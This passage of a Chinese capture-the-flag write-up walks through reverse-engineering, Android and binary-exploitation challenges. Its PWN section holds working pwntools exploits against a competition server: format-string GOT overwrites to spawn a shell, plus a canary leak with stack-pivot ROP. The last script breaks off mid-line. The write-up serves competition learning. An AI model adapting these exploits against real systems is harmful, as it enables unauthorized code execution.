<h2 id="Bob’s-Code"><a href="#Bob’s-Code" class="headerlink" title="Bob’s Code"></a>Bob’s Code</h2><p>在主函数中的sub_4116C7这个函数跟进去是一个base64加密。<br><img src="https://img-blog.csdnimg.cn/25a666c451a448288da711a45fdd9bf7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>sub_411389跟进去也是一个base64加密，这里进行了换表<br>下面是对字符串进行加点<br><img src="https://img-blog.csdnimg.cn/4554e711e69e4b848149a22ab35e0508.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/890096c733474017947d4a030c280787.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>sub_4116E0是对字符串进行位移变换，<br>payload</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">one</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">one</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">one</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> Str[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">char</span> a1[] = <span class="hljs-string">&quot;.W1BqthGbfGvLc3IaAWByo.W15oXRKXiUyXXBYe01VoVlKX2zWVNJUuilkoF0.&quot;</span>;<br>    <span class="hljs-type">int</span> a2 = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(a1);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">128</span>; j++) &#123;<br>            a[i] = j;<br>            <span class="hljs-keyword">if</span> (a[i] &lt; <span class="hljs-number">65</span> || a[i] &gt; <span class="hljs-number">90</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (a[i] &gt;= <span class="hljs-number">97</span> &amp;&amp; a[i] &lt;= <span class="hljs-number">122</span>) &#123;<br>                    a[i] = (a[i] + a2 - <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                a[i] = (a[i] + a2 - <span class="hljs-number">65</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)a[i] == a1[i]) &#123;<br>                Str[i] = j;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num = <span class="hljs-number">0</span>; num &lt; len; num++) &#123;<br>        cout &lt;&lt; Str[num];<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br>得到的密文去点进行换表base64解密，在进行base64解密<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br>str1 = <span class="hljs-string">&quot;U1ZorfEzdEtJa3GyYUZwmU15mVPIVgSwVVZWc01TmTjIV2xUTLHSsgjimD0====&quot;</span><br>string1 = <span class="hljs-string">&quot;ABCDEfghijklmnopqrsTUVWXYZabcdeFGHIJKLMNOPQRStuvwxyz0123456789-_&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br>flag1 = base64.<span class="hljs-built_in">b64decode</span>(str1.<span class="hljs-built_in">translate</span>(str.<span class="hljs-built_in">maketrans</span>(string1,string2)))<br>flag = base64.<span class="hljs-built_in">b64decode</span>(flag1)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="Amy’s-Code-1"><a href="#Amy’s-Code-1" class="headerlink" title="Amy’s Code"></a>Amy’s Code</h2><p><img src="https://img-blog.csdnimg.cn/65c235c58cd74997a96e37a9dd7a36cc.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入的字符串从第五位到”<em>“这一部分传入到Jlast，在Jlast里面进行md5+base64，<img src="https://img-blog.csdnimg.cn/ee1e8810d90b4909936d26896f94f4d8.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>从这里可以看出，”</em>“到倒数第二位全部进行AES加密再进行base64加密，<br>key为加密之后的”K@e2022%%y”,<br>iv是”I&amp;V2022*”,<br>进行逆向运算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">bool</span> z = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">char</span> a[] = <span class="hljs-string">&quot;=IkMBb+=gF2/Try5PCUruw1j&quot;</span>;<br>    <span class="hljs-type">char</span> b[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i2 = <span class="hljs-number">5</span>; i2 &gt;= <span class="hljs-number">0</span>; i2--) &#123;<br>        <span class="hljs-keyword">if</span> (!z) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i3 = <span class="hljs-number">3</span>; i3 &gt;= <span class="hljs-number">0</span>; i3--) &#123;<br>                b[(i3 * <span class="hljs-number">6</span>) + i2] = a[i];<br>                i++;<br>            &#125;<br>            z = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i4 = <span class="hljs-number">0</span>; i4 &lt;= <span class="hljs-number">3</span>; i4++) &#123;<br>                b[(i4 * <span class="hljs-number">6</span>) + i2] = a[i];<br>                i++;<br>            &#125;<br>            z = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num = <span class="hljs-number">0</span>; num &lt; <span class="hljs-number">24</span>; num++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; b[num];<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>然后将得到的内容进行MD5，base64解密。<br>得到的内容进行aes解密<br><img src="https://img-blog.csdnimg.cn/aad512f797a24ee69585a55ff24d5c65.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>就能得到flag。</p>
<h2 id="MobileB"><a href="#MobileB" class="headerlink" title="MobileB"></a>MobileB</h2><p><img src="https://img-blog.csdnimg.cn/f9d3711a89614bbe9a946a957b0df617.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cc97258327bd4982b3f145b72b21039f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>通过分析so文件 构造·payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;加密的数据:&quot;</span>)[:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入so的数据:&quot;</span>)<br>b = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;one:&quot;</span>)<br>b+=b<br>c = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;two:&quot;</span>)<br>c+=c<br>d = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;three:&quot;</span>)<br>d+=d<br>e = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;four:&quot;</span>)<br>e+=e<br>f = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;five:&quot;</span>)<br>f+=f<br>g = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;six:&quot;</span>)<br>g+=g<br>h = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;seven:&quot;</span>)<br>h+=h<br>i = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;eight:&quot;</span>)<br>i+=i<br>j = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;nine:&quot;</span>)<br>j+=j<br>k = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;ten:&quot;</span>)<br>k+=k<br>l = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;eleven:&quot;</span>)<br>l+=l<br>m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;twelve:&quot;</span>)<br>m+=m<br>n = [<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">51</span>,<span class="hljs-number">2</span>,<span class="hljs-number">52</span>,<span class="hljs-number">12</span>,<span class="hljs-number">512</span>,<span class="hljs-number">3</span>,<span class="hljs-number">53</span>,<span class="hljs-number">13</span>,<span class="hljs-number">513</span>,<span class="hljs-number">23</span>,<span class="hljs-number">523</span>,<span class="hljs-number">123</span>,<span class="hljs-number">5123</span>,<span class="hljs-number">4</span>,<span class="hljs-number">54</span>,<span class="hljs-number">14</span>,<span class="hljs-number">514</span>,<span class="hljs-number">24</span>,<span class="hljs-number">524</span>,<span class="hljs-number">124</span>,<span class="hljs-number">5124</span>,<span class="hljs-number">34</span>,<span class="hljs-number">534</span>,<span class="hljs-number">134</span>,<span class="hljs-number">5134</span><br>,<span class="hljs-number">234</span>,<span class="hljs-number">5234</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">51234</span>]<br>a=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,a.split(<span class="hljs-string">&quot;0&quot;</span>)))<br>o=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>p = []<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> a:<br>    p.append(o[n.index(r)])<br>q = [d,m,g,i,h,c,e,l,b,f,j,k]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ISCC&#123;&quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    <span class="hljs-built_in">print</span>(q[r][q[r].index(p[r],<span class="hljs-number">26</span>)-<span class="hljs-number">9</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="MobileC"><a href="#MobileC" class="headerlink" title="MobileC"></a>MobileC</h2><p>输入错误会有”输入错误，继续加油”的提示。<br>逻辑分析： 将输入进行 CBC 模式的 AES 加密，key通过Myjni.GetKey 获得，iv 是 aUBTJjg4Q2NDLg&#x3D;&#x3D; 然后Base64后调用了 GetStr 后和指定的字符串比较，GetKey和GetStr都是mobilec库里的native函数<br><img src="https://img-blog.csdnimg.cn/8da16153644849aeaf8a20f1fdf0c050.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>GetKey和GetStr都是mobilec库里的native函数<br>GetKey的值可以通过 objection hook直接获得： QERAPG9dPyZfTC5f<br><img src="https://img-blog.csdnimg.cn/ad83bf04819d418d899dd08a1fe7c5d5.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/08b1609b36424793bbfd78b42ce34519.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>在libmobilec.so中找到Java_com_example_mobilec_MyJNI_Myjni_GetStr<br>调用了GetStrc</p>
<p>GetStrc里将第一个输入用”&#x3D;”补齐，然后分成了6组，<br>然后根据第二个输入选择6组中的几组作为结果返回，逆推回去，所以结果肯定6个组都包含，所以只需排列组合一下，用aes解密后筛选出有意义的答案即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">password</span>):<br>key = <span class="hljs-string">b&#x27;QERAPG9dPyZfTC5f&#x27;</span><br>iv = <span class="hljs-string">b&quot;aUBTJjg4Q2NDLg==&quot;</span><br>aes = AES.new(key,AES.MODE_CBC,iv)<br>result = aes.decrypt(base64.b64decode(password.encode()))<br><span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br>t =[<span class="hljs-string">&#x27;c3KJ+XJQ&#x27;</span>,<span class="hljs-string">&#x27;zJbrlKs=&#x27;</span>,<span class="hljs-string">&#x27;NzQp2BU=&#x27;</span>,<span class="hljs-string">&#x27;iLfdeK4=&#x27;</span>,<span class="hljs-string">&#x27;J0xVWTT=&#x27;</span>,<span class="hljs-string">&#x27;N3k3Kzy=&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> product(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>),repeat=<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(c)) != <span class="hljs-built_in">len</span>(c):<br><span class="hljs-keyword">continue</span><br>d = [<span class="hljs-number">0</span>] + <span class="hljs-built_in">list</span>(c)<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> d:<br>s+=t[idx][i]<br><span class="hljs-built_in">print</span>(decrypt(s[:-<span class="hljs-number">4</span>]))<br></code></pre></td></tr></table></figure>

<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="create-id"><a href="#create-id" class="headerlink" title="create_id"></a>create_id</h2><p>通过代码分析，格式化字符串漏洞将X等于9就可以cat flag.txt.<br>我们的格式化字符串位置在第10位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&quot;123.57.69.203&quot;</span>,<span class="hljs-number">7010</span>)<br><span class="hljs-comment">#p = process(&quot;./sp1&quot;)</span><br><span class="hljs-comment">#context(log_level=&quot;debug&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sp1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>p.recvuntil(<span class="hljs-string">&quot;Can you find the magic word?\n&quot;</span>)<br>printf_got =elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload1 = p32(puts_got)+<span class="hljs-string">b&#x27;%6$s&#x27;</span><br>p.sendline(payload1)<br>p.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>    <br>base_addr = puts_addr - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>sys_addr = base_addr + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>,&#123;printf_got:sys_addr&#125;)<br>p.recvuntil(<span class="hljs-string">&#x27;a\n&#x27;</span>)<br><br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><p>发现格式化字符串漏洞,IDA跟asvj****函数，里面调用了str的相关函数<br>使用returm to libc的方法<br>传入&#x2F;bin&#x2F;sh然后劫持printf函数就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io=process(&quot;./sp1&quot;)</span><br>io=remote(<span class="hljs-string">&quot;123.57.69.203&quot;</span>,<span class="hljs-number">7010</span>)<br>elf = ELF(<span class="hljs-string">&quot;./sp1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>io.recvuntil(<span class="hljs-string">&quot;Can you find the magic word?\n&quot;</span>)<br><br>pay_1 = p32(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])+<span class="hljs-string">&quot;%6$s&quot;</span><br><span class="hljs-comment">#gdb.attach(io)	</span><br>io.sendline(pay_1)<br>io.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;puts_got=&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr)<br><span class="hljs-comment">#gdb.attach(io)</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;printf_got=&quot;</span>+<span class="hljs-built_in">hex</span>(printf_got)<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;system_addr=&quot;</span>+<span class="hljs-built_in">hex</span>(system_addr)<br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br><br>payload1 = fmtstr_payload(<span class="hljs-number">6</span>, &#123;printf_got: system_addr&#125;)<br>io.recvuntil(<span class="hljs-string">&quot;A\n&quot;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendline(payload1)<br>io.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br><br>io.interactive();<br></code></pre></td></tr></table></figure>

<h2 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a>跳一跳</h2><p>Checksec 保护全开，猜测泄露Canary和栈迁移，构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p=remote(<span class="hljs-string">&#x27;123.57.69.203&#x27;</span>,<span class="hljs-number">7020</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Hello CTFer! Welcome to the world of pwn~\n&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./attachment-10&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">216</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;65&#x27;</span>)<br><br>p.send(<span class="hljs-string">b&#x27;c&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span>)<br>result=p.recv()<br>canary=u64(result[:<span class="hljs-number">7</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))*<span class="hljs-number">16</span>*<span class="hljs-number">16</span><br>ebp=u64(result[<span class="hljs-number">7</span>:<span class="hljs-number">13</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>p.send(<span class="hljs-string">b&#x27;0&#x27;</span>*(<span class="hljs-number">0xe0</span>-<span class="hljs-number">8</span>)+p64(canary)+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+p8(<span class="hljs-number">0x98</span>))<br><span class="hljs-comment">#第二次main</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">231</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;65&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span>)<br><br>main=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">24</span><br>elf_base=main-<span class="hljs-number">0x128F</span><br>init=elf_base+<span class="hljs-number">0x1298</span><br>put_got=elf_base+elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>put_plt=elf_base+elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=elf_base+<span class="hljs-number">0x130b</span><br>leave=elf_base+<span class="hljs-number">0x124A</span><br>ret=elf_base+<span class="hljs-number">0x1016</span><br><br>init_1=elf_base+<span class="hljs-number">0x1250</span><br>fun=elf_base+<span class="hljs-number">0x1185</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(put_plt))<br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(main)<br>p.send(payload.ljust(<span class="hljs-number">0xe0</span>-<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(canary)+p64(ebp-<span class="hljs-number">0xf0</span>)+p64(leave))<br><br><span class="hljs-comment">#获取libc</span><br>puts_addr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br><span class="hljs-comment">#第三次main</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">231</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>p.sendline(<span class="hljs-string">b&#x27;65&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span>)<br>payload=p64(ret)+p64(ret)+p64(pop_rdi)+p64(ebp-<span class="hljs-number">0xd0</span>)+p64(system)<br>p.send(payload.ljust(<span class="hljs-number">0xe0</span>-<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(canary)+p64(ebp-<span class="hljs-number">0xf0</span>-<span 